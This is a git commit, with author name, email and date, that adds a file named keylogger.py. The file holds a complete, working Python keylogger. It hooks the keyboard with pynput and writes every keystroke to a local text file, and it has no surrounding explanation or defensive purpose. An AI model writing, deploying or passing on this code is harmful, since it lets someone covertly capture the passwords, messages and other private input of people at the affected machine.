48cebf497b14bc1b76c0ce3f118f19e18d72be27
yassine <yassinetahery6@outlook.com>
2025-05-21 23:34:21 +0100

    'repo'

---
+++ keylogger.py
@@ -0,0 +1,17 @@
+from pynput.keyboard import Listener
+
+log_file = "keystrokes.txt"
+
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f'{key.char}')
+    except AttributeError:
+        
+        with open(log_file, "a") as f:
+            f.write(f' [{key}] ')
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
